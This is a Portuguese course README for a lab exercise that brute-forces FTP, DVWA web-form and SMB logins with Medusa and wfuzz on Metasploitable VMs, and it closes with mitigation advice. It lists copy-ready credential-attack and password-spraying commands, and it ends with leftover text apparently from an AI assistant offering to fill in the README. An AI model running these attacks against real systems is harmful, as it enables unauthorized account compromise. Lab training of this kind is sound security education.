# Brute Force com Kali + Medusa (Ambiente Controlado)
# Desafio — Auditoria por Força Bruta com Kali Linux e Medusa

Resumo
-----
Este projeto documenta um exercício prático de auditoria de senha por força bruta em ambiente controlado. O objetivo é aplicar conceitos vistos nas aulas usando Kali Linux e a ferramenta Medusa contra máquinas vulneráveis (ex.: Metasploitable 2 e DVWA), registrar os procedimentos, validar acessos obtidos e propor medidas de mitigação.

AVISO IMPORTANTE
-----
Este trabalho foi realizado em ambiente isolado e controlado (máquinas virtuais). Nunca execute ataques por força bruta ou outras técnicas de intrusão contra sistemas sem autorização explícita do dono/administrador da infraestrutura. Uso responsável e legal é obrigatório.

Objetivos
-----
- Compreender e demonstrar ataques de força bruta em serviços comuns: FTP, Web (formulário) e SMB.
- Configurar um ambiente de testes com VMs (Kali + Metasploitable / DVWA).
- Usar o Medusa para automatizar tentativas de senha (e outras ferramentas quando aplicável).
- Criar e usar wordlists simples para testes.
- Documentar passos, comandos e resultados.
- Propor medidas de mitigação para as vulnerabilidades exploradas.
- Publicar evidências organizadas (com captura de telas opcionais).

Estrutura do repositório
-----
- README.md — este arquivo.
- /wordlists — wordlists usadas nos testes (ex.: ftp-small.txt, dvwa-small.txt, smb-small.txt).
- /scripts — scripts auxiliares (se houver).
- /images — capturas de tela dos processos e resultados (opcional).
- /notes — notas e registros das sessões (opcional).

Ambiente de Teste (exemplo)
-----
- VirtualBox (ou outro hypervisor)
- 2 VMs:
  - Kali Linux (atacante)
  - Metasploitable 2 (alvo) — contém serviços vulneráveis (FTP, SMB, etc.)
  - (Opcional) DVWA rodando em outra VM/serviço web vulnerável para testes de formulário.
- Rede: host-only / internal network (rede isolada entre VMs)
- Snapshots: crie snapshots antes dos testes para recuperação.

Preparação
-----
1. Configurar VMs:
   - Instale Kali e Metasploitable 2 no VirtualBox.
   - Configure ambas para usar a mesma rede interna ou host-only para que se enxerguem.
2. Atualizações (Kali):
   - sudo apt update && sudo apt upgrade -y
3. Ferramentas:
   - Medusa (geralmente já disponível no Kali). Para instalar caso necessário:
     - sudo apt install medusa
   - Outras ferramentas opcionais: hydra, nmap, smbclient, enum4linux, curl, burpsuite, wfuzz.

Mapeamento inicial
-----
1. Identificar IP das VMs:
   - ifconfig / ip a (em cada VM) ou use DHCP do host-only.
2. Descoberta de serviços:
   - nmap -sC -sV -p- -oN recon.txt <IP_ALVO>
   - Revisar portas e serviços: FTP (21), HTTP (80), SMB (445/139) etc.

Cenários e comandos exemplares
-----

1) Força bruta em FTP (serviço vsftpd / ProFTPD)
- Wordlist de exemplo: wordlists/ftp-small.txt (nomes de usuário / senhas simples)
- Comando Medusa:
  - medusa -h <IP_ALVO> -u <usuario> -P wordlists/ftp-small.txt -M ftp -n 21 -f
  - Exemplos:
    - medusa -h 192.168.56.101 -u msfadmin -P wordlists/ftp-small.txt -M ftp
    - medusa -h 192.168.56.101 -U wordlists/ftp_users.txt -P wordlists/ftp-small.txt -M ftp
- Observações:
  - Parâmetro -U para lista de usuários, -P para lista de senhas.
  - -f instrução para terminar após encontrar credenciais válidas (quando suportado).
- Validação:
  - ftp <IP_ALVO>
  - Ou: curl ftp://<usuario>:<senha>@<IP_ALVO>/

2) Ataque em formulário web (DVWA)
- Cenário: DVWA com formulário de login vulnerável e nível de segurança configurado para baixo.
- Estratégia: automatizar tentativas via Burp Intruder, wfuzz ou Medusa (modo http_form) se disponível.
- Exemplo com Medusa (http_form):
  - medusa -h http://<IP_DVWA>/login.php -u admin -P wordlists/dvwa-small.txt -M http_form:/login.php:username:password:login=Login
  - Observação: O módulo http_form exige parâmetros corretos de campo e payload locais; muitas vezes é mais simples usar wfuzz:
  - wfuzz -c -w wordlists/dvwa-small.txt --hc 302,404 http://<IP_DVWA>/login.php?username=FUZZ&password=senha
- Validação:
  - Ao encontrar credenciais, efetuar login manualmente no navegador e tirar captura.
  - Registrar requisições/respostas (Burp) e status codes.

3) Password spraying / brute force em SMB (enumenação de usuários)
- Enumeração de usuários:
  - enum4linux -a <IP_ALVO>
  - rpcclient / samba tools:
    - rpcclient -U "" <IP_ALVO>
- Password spraying com Medusa:
  - medusa -h <IP_ALVO> -U wordlists/smb_users.txt -P wordlists/smb-small.txt -M smbnt -n 445
  - Exemplo:
    - medusa -h 192.168.56.101 -U wordlists/smb_users.txt -P wordlists/smb-small.txt -M smbnt
- Validação:
  - smbclient -L //<IP_ALVO> -U <usuario>%<senha>
  - mount.cifs / outras ferramentas para confirmar acesso (somente em ambiente de teste).
- Observações:
  - "Password spraying" tenta poucas senhas amplamente em muitos usuários para evitar bloqueio de conta.

Wordlists
-----
- wordlists/ftp-small.txt — lista curta de senhas comuns (ex.: 123456, password, admin)
- wordlists/ftp_users.txt — lista de usuários comuns
- wordlists/dvwa-small.txt — senhas para testar formulários web
- wordlists/smb-small.txt — senhas para SMB
- Recomendações:
  - Comece com listas pequenas e específicas; depois teste com listas maiores.
  - Gere wordlists com ferramentas como crunch ou use listas públicas (rockyou) apenas em ambiente controlado.

Exemplos de saída e validação
-----
- Para cada ataque documente:
  - Comando executado (com parâmetros claros).
  - Trecho do output que mostra credenciais encontradas.
  - Comprovação de acesso (ex.: screenshot em /images, log de sessão ou comando de verificação).
  - Tempo de execução aproximado.
- Sempre registre o estado inicial (snapshot) e restaure a VM após os testes se necessário.

Medidas de Mitigação e Recomendações
-----
- Políticas de senha:
  - Exigir senhas fortes (complexidade e comprimento mínimo).
  - Uso de filtros de senhas (bloquear senhas conhecidas/fracas).
- Proteção contra brute force:
  - Bloqueio temporário após X tentativas falhas (account lockout, rate limiting).
  - Implementar CAPTCHA em formulários de login.
  - Implementar throttling (limitar tentativas por IP).
- Autenticação forte:
  - Habilitar autenticação multifator (MFA).
  - Preferir autenticação baseada em chaves (em vez de senhas) quando aplicável.
- Monitoramento e detecção:
  - Logs, alertas de tentativas repetidas e análise comportamental.
  - Sistemas de prevenção (fail2ban, WAF).
- Segurança de rede:
  - Restringir exposições de serviços (acesso apenas por VPN ou rede interna).
- Patch e configuração segura:
  - Atualizar serviços e remover serviços desnecessários.
  - Garantir configurações seguras (ex.: FTP anônimo desabilitado).

Boas práticas para documentação no GitHub
-----
- README claro e bem estruturado (este arquivo).
- Incluir exemplos de comando com explicação.
- Incluir wordlists e scripts usados (não incluir listas de senhas sensíveis para ambientes reais).
- Capturas de tela em /images com legendas e contexto (onde foi tirada, o que mostra).
- Adicionar arquivo NOTES.md ou LOGS.md com passo-a-passo de cada sessão (opcional).
- Incluir um arquivo LICENSE se desejar (ex.: MIT) e um arquivo CONTRIBUTING.md se aceitar contribuições.

Checklist para entrega
-----
- [ ] Assistir todas as vídeo-aulas (conforme instrução do curso).
- [ ] Criar repositório público no GitHub.
- [ ] Incluir README.md detalhado.
- [ ] Incluir wordlists (/wordlists) e/ou scripts (/scripts).
- [ ] Incluir evidências (/images) — opcional, mas recomendado.
- [ ] Submeter link do repositório no portal do curso.

Exemplo mínimo de comandos para copiar
-----
- nmap:
  - nmap -sC -sV -p- -oN recon.txt 192.168.56.101
- FTP (Medusa):
  - medusa -h 192.168.56.101 -u msfadmin -P wordlists/ftp-small.txt -M ftp
- DVWA (wfuzz):
  - wfuzz -c -w wordlists/dvwa-small.txt --hc 302,404 http://192.168.56.102/login.php?username=FUZZ&password=1234
- SMB (enum + medusa):
  - enum4linux -a 192.168.56.101
  - medusa -h 192.168.56.101 -U wordlists/smb_users.txt -P wordlists/smb-small.txt -M smbnt

Registro de Aprendizado e Reflexões (sugestão)
-----
- O que funcionou bem? (por exemplo: medusa encontrou credenciais simples de FTP)
- O que foi difícil? (por exemplo: ajustar payloads para formulários web)
- O que você aprendeu sobre mitigação e operações defensivas?
- Próximos passos: testar rate limiting, integrar fail2ban, evoluir wordlists, estudar ferramentas alternativas (Hydra, Burp, CrackMapExec).

Considerações finais
-----
Este projeto tem como foco o aprendizado prático e responsável das técnicas de auditoria de senhas. Documente cada experimento com clareza, foque em explicar por que usou cada comando e qual o resultado esperado/obtido. Isso transforma o repositório em um bom material de portfólio técnico.

Se quiser, eu posso:
- Gerar um README pronto com seus dados e IPs específicos (me passe: IPs das VMs, nomes de arquivos de wordlist que você quer incluir, screenshots que você tem).
- Gerar exemplos de wordlists pequenas.
- Criar scripts de automação para os testes e colocar aqui como arquivos.

Quer que eu gere o README já preenchido com exemplos e arquivos (wordlists simples) prontos para incluir no repositório? Se sim, me passe os IPs das VMs e os nomes preferidos para as wordlists/screenshot filenames.
